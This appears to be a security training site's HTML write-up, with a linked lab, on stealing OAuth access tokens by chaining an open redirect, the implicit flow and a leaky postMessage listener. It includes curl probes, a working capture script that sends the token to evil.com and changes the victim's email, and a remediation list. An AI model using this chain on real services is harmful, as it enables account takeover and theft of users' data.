@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OAuth Dirty Dancing: Open Redirect to Token Theft - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/oauth/level2.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev high">High</span>
+      <span class="writeup-category">OAuth &middot; Open Redirect &middot; Token Theft &middot; Chain</span>
+    </div>
+
+    <h1>OAuth Dirty Dancing: Open Redirect to Token Theft</h1>
+    <div class="writeup-author">Inspired by <strong>xssdoctor</strong>'s OAuth research &middot; Pattern found on Uber, Calendly, and numerous OAuth implementations</div>
+
+    <div class="callout callout-vuln">
+      <h4>Vulnerability</h4>
+      <p>Multiple subdomains accept unvalidated redirect parameters (<code>return_to</code>, <code>next_url</code>). When chained with OAuth implicit flow (<code>response_type=token</code>), an attacker can steal access tokens via the URL fragment. Adding a postMessage gadget on the error page enables stealing tokens even when the redirect_uri is partially validated.</p>
+    </div>
+
+    <h2>The Three Components</h2>
+
+    <h3>Component 1: Open Redirect</h3>
+    <p>Admin and internal subdomains often have weaker redirect validation than the main app:</p>
+
+    <pre><code># admin.target.com accepts any external URL in return_to
+curl -sv "https://admin.target.com/identity/?return_to=https://evil.com" \
+  2>&1 | grep "location:"
+# Location: https://evil.com
+
+# bonjour.target.com accepts any URL in next_url
+curl -sv "https://bonjour.target.com/?next_url=https://evil.com" \
+  2>&1 | grep "location:"
+# Location: https://evil.com
+
+# Staging environments often have NO validation at all
+curl -sv "https://admin-staging.target.com/identity/?return_to=https://evil.com" \
+  2>&1 | grep "location:"
+# Location: https://evil.com</code></pre>
+
+    <h3>Component 2: OAuth Implicit Flow</h3>
+    <p>If the OAuth provider supports <code>response_type=token</code> (implicit grant), the access token is placed in the URL fragment of the redirect URI. The fragment travels with redirects:</p>
+
+    <pre><code># Normal OAuth flow (authorization code - safe)
+https://auth.target.com/oauth/authorize?
+  client_id=app&
+  response_type=code&           # Code in query string
+  redirect_uri=https://app.target.com/callback
+
+# Implicit flow (token in fragment - dangerous)
+https://auth.target.com/oauth/authorize?
+  client_id=app&
+  response_type=token&          # Token in URL fragment!
+  redirect_uri=https://app.target.com/callback
+
+# After auth, user is redirected to:
+# https://app.target.com/callback#access_token=eyJhbG...&token_type=bearer</code></pre>
+
+    <h3>Component 3: PostMessage Gadget</h3>
+    <p>Many OAuth callback/error pages include analytics scripts that leak the page URL via postMessage. Even if the redirect doesn't directly send the token to the attacker, a postMessage gadget can:</p>
+
+    <pre><code>// Common analytics pattern on OAuth error pages
+window.__analytics = { pageUrl: window.location.href };
+
+window.addEventListener('message', function(e) {
+  if (e.data.type === 'getAnalytics') {
+    // Responds to ANY origin with the full page URL
+    // including the #access_token fragment!
+    e.source.postMessage({
+      type: 'analyticsData',
+      url: window.__analytics.pageUrl  // Contains the token!
+    }, '*');
+  }
+});</code></pre>
+
+    <div class="callout callout-chain">
+      <h4>The Dirty Dancing Chain</h4>
+      <p><strong>Bug 1:</strong> Open redirect on <code>admin.target.com</code> via <code>return_to</code> parameter</p>
+      <p><strong>Bug 2:</strong> OAuth supports implicit flow (<code>response_type=token</code>)</p>
+      <p><strong>Bug 3:</strong> PostMessage gadget on error/callback page leaks URL to any origin</p>
+      <p><strong>Result:</strong> One-click account takeover &mdash; victim clicks a link, attacker gets their access token</p>
+    </div>
+
+    <h2>The Attack</h2>
+
+    <div class="attack-flow">
+      <h4>Attack Flow: Open Redirect + Implicit Flow</h4>
+      <div class="flow-step"><div class="flow-num">1</div><p>Attacker crafts OAuth URL: <code>auth.target.com/oauth/authorize?response_type=token&redirect_uri=https://admin.target.com/identity/?return_to=https://evil.com/steal</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">2</div><p>Victim clicks the link, authenticates on <code>auth.target.com</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">3</div><p>OAuth server redirects to <code>admin.target.com/identity/?return_to=https://evil.com/steal#access_token=eyJ...</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">4</div><p><code>admin.target.com</code> follows the open redirect to <code>evil.com/steal#access_token=eyJ...</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">5</div><p>Attacker's page reads <code>window.location.hash</code> &mdash; access token captured!</p></div>
+    </div>
+
+    <h3>Attacker's Token Capture Page</h3>
+    <pre><code>&lt;!-- https://evil.com/steal --&gt;
+&lt;script&gt;
+// Extract token from URL fragment
+const fragment = window.location.hash.substring(1);
+const params = new URLSearchParams(fragment);
+const token = params.get('access_token');
+
+if (token) {
+  // Exfiltrate the token
+  fetch('https://evil.com/log', {
+    method: 'POST',
+    body: JSON.stringify({ token: token })
+  });
+
+  // Use token to access victim's account
+  fetch('https://api.target.com/v1/me', {
+    headers: { 'Authorization': 'Bearer ' + token }
+  }).then(r => r.json()).then(profile => {
+    // Change victim's email for full ATO
+    fetch('https://api.target.com/v1/me', {
+      method: 'PUT',
+      headers: {
+        'Authorization': 'Bearer ' + token,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ email: 'attacker@evil.com' })
+    });
+  });
+}
+&lt;/script&gt;</code></pre>
+
+    <h2>Advanced: Response Type Juggling</h2>
+    <p>Some OAuth providers accept multiple response types in one request. This enables "response type juggling" where the attacker forces the server to return both a code AND a token:</p>
+
+    <pre><code># Request both code and token
+response_type=code,token
+# Server returns code in query AND token in fragment
+
+# Or hybrid flow
+response_type=code,id_token
+# Server returns code in query AND id_token in fragment
+
+# Even if redirect_uri is validated for 'code' flow,
+# the 'token' in the fragment still travels with the redirect!</code></pre>
+
+    <div class="callout callout-impact">
+      <h4>Why It Matters</h4>
+      <p>OAuth token theft is one of the highest-impact client-side bugs. A stolen access token gives the attacker full API access as the victim &mdash; read private data, change account settings, make purchases, send messages. Many programs pay $5K-$15K for OAuth token theft chains. The key insight is that <strong>three medium-severity bugs chain into a critical account takeover</strong>.</p>
+    </div>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>When you find an open redirect, <strong>immediately check</strong> if the same domain has OAuth endpoints. Test <code>response_type=token</code> and <code>response_type=code,token</code>. If the OAuth server returns tokens in the fragment and the redirect carries the fragment to your domain, you have a high-severity chain. Also look for postMessage gadgets on OAuth callback/error pages &mdash; analytics scripts are the most common source.</p>
+    </div>
+
+    <h2>Remediation</h2>
+    <ul>
+      <li>Disable implicit flow (<code>response_type=token</code>) &mdash; use authorization code flow with PKCE</li>
+      <li>Validate redirect URIs with exact-match allowlist, not prefix/substring checks</li>
+      <li>Never allow open redirects on domains that participate in OAuth flows</li>
+      <li>Remove postMessage gadgets from OAuth callback/error pages</li>
+      <li>Add interstitial warning pages for external redirects</li>
+    </ul>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice This Vulnerability</h4>
+        <p>Lab: OAuth Dirty Dancing &mdash; combine open redirect, implicit flow, and a postMessage gadget to steal the victim's access token.</p>
+      </div>
+      <a href="/labs/oauth/level2.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/prototype-pollution-xss-chain">&larr; Prototype Pollution to XSS</a>
+      <a href="/writeups/cors-any-origin-health-data">CORS Any Origin Health Data &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
